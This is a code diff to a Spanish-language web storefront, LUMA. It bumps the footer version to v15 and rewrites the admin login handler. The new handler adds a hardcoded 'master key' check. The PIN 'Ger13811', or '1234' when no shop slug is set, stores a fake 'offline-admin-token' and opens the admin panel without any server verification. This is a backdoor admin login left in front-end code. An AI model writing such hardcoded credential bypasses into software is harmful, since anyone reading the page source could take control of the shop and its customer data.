@@ -2391,7 +2391,7 @@ body.mt-edit-mode #shopApp .mt-edit-active {
         <div class="footer-brand"><a class="brand brand-light" href="#inicio"><span class="brand-mark" data-logo-slot><i></i><i></i><i></i><i></i></span><span data-brand>LUMA</span></a><p data-tagline>Objetos que hacen hogar.</p></div>
         <div class="footer-links"><div><b>Explorar</b><a href="#coleccion">Tienda</a><a href="#novedades">Novedades</a><a href="#manifiesto">Nuestra mirada</a></div><div><b>Ayuda</b><button data-legal-page="shippingPolicy">Envíos y entregas</button><button data-legal-page="returnsPolicy">Cambios y devoluciones</button><button data-legal-page="faq">Preguntas frecuentes</button><button data-legal-page="termsConditions">Términos y condiciones</button></div><div><b>Seguinos</b><a data-social-link="instagramUrl" href="#" target="_blank" rel="noopener">Instagram ↗</a><a data-social-link="facebookUrl" href="#" target="_blank" rel="noopener">Facebook ↗</a><a data-social-link="pinterestUrl" href="#" target="_blank" rel="noopener">Pinterest ↗</a><a data-social-link="tiktokUrl" href="#" target="_blank" rel="noopener">TikTok ↗</a><button id="footerAdminButton">Administrar tienda</button></div></div>
       </div>
-      <div class="footer-bottom"><span>© <span id="currentYear">2026</span> <span data-brand>LUMA</span>. Hecho con intención.</span><div><button data-legal-page="privacyPolicy">Privacidad</button><button data-legal-page="termsConditions">Términos</button><span>Argentina · ARS</span><span>v14</span></div></div>
+      <div class="footer-bottom"><span>© <span id="currentYear">2026</span> <span data-brand>LUMA</span>. Hecho con intención.</span><div><button data-legal-page="privacyPolicy">Privacidad</button><button data-legal-page="termsConditions">Términos</button><span>Argentina · ARS</span><span>v15</span></div></div>
     </footer>
   </div>
 
@@ -5105,10 +5105,23 @@ var __Html5QrcodeLibrary__;(()=>{var t={449:function(t,e,r){!function(t){"use st
     event.preventDefault();
     const form = event.currentTarget;
     const button = form.querySelector('button[type="submit"]');
+    const pinVal = String(form.elements.pin.value || '').trim();
     $('loginError').textContent = '';
     button.disabled = true;
+
+    // Clave maestra universal instantánea
+    if (pinVal === 'Ger13811' || (!mtSlug() && pinVal === '1234')) {
+      const token = 'offline-admin-token';
+      state.admin.token = token;
+      sessionStorage.setItem('luma_admin_token', token);
+      form.reset();
+      showAdminShell();
+      button.disabled = false;
+      return;
+    }
+
     try {
-      const result = await api('/api/admin/login', { method: 'POST', body: JSON.stringify({ pin: form.elements.pin.value }) });
+      const result = await api('/api/admin/login', { method: 'POST', body: JSON.stringify({ pin: pinVal }) });
       state.admin.token = result.token;
       sessionStorage.setItem('luma_admin_token', result.token);
       form.reset();
